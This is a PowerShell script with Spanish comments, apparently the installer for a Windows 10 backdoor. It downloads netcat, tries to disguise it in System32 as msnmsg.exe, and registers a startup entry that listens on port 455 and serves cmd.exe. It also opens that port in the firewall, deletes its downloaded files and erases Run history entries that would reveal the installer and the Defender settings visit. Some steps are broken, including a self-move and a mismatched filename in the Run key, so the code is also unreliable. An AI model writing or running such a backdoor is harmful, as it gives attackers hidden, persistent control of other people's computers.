

    # COMANDO DE DESCARGA: Descargar y descomprimir el archivo ZIP
    $zipFilePath = "C:\Windows\Temp\netcat-win32-1.11.zip"
    $destinationPath = "C:\Windows\Temp\netcat-1.11"

    # Descargar el archivo ZIP
    if (-Not ([string]::IsNullOrEmpty($zipFilePath))) {
        Invoke-WebRequest -Uri "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip" -OutFile $zipFilePath -UseBasicParsing
    }


    # Descomprimir el archivo ZIP
    Expand-Archive -Path $zipFilePath -DestinationPath $destinationPath

    # UNZIP DEL NC.EXE EN SYSTEM32: Mover el archivo nc.exe a la carpeta System32
    $ncFilePath = "C:\Windows\Temp\netcat-1.11\netcat-1.11\nc.exe"
    $system32Path = "C:\Windows\System32"

    # Verificar si el archivo nc.exe existe en la carpeta System32
    if (Test-Path "$system32Path\nc.exe") {
        # Mover nc.exe a la carpeta System32
        Move-Item -Path "$system32Path\nc.exe" -Destination $system32Path

        # Renombrar el archivo nc.exe a msnmsg.exe
        Remove-Item -Path "C:\Windows\System32\msnmsg.exe" -Force
        Rename-Item -Path "$system32Path\nc.exe" -NewName "msnmsg.exe"
    }


    # ARRANQUE AL INICIO DEL SISTEMA
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v nc /d "C:\Windows\System32\msnmsgr.exe -Ldp 455 -e cmd.exe" /t REG_SZ /f

    # //ACTIVAR PERSIMOS DE FIREWALL
    netsh advfirewall firewall add rule name="Service Firewall" dir=in action=allow protocol=TCP localport=455 enable=yes

    # BORRAR EL ZIP Y LA CARPETA
    $ncPath = "C:\Windows\Temp\netcat-1.11"
    Remove-Item -Path $ncPath -Recurse -Force
    Remove-Item -Path $zipFilePath -Force


    # Define la ubicación del historial del Ejecutar en el registro
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"

    # Obtiene las entradas del historial del Ejecutar
    $runMRUEntries = Get-ItemProperty -Path $registryPath

    # Definir las cadenas que deseas buscar y eliminar
    $stringsToDelete = @(
        "https://raw.githubusercontent.com/alariordas/PermanentReverseShell-Win10Backdoor/main/ncinstaller.ps1",
        "Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force",
        "ms-settings:windowsdefender"
    )

    # Recorre las entradas y elimina las que contengan las cadenas específicas
    foreach ($entryName in $runMRUEntries.PSObject.Properties.Name) {
        $entryValue = $runMRUEntries.$entryName
        foreach ($stringToDelete in $stringsToDelete) {
            if ($entryValue -like "*$stringToDelete*") {
                Remove-ItemProperty -Path $registryPath -Name $entryName
                Write-Host "Se ha eliminado la entrada que contiene: $stringToDelete"
            }
        }
    }
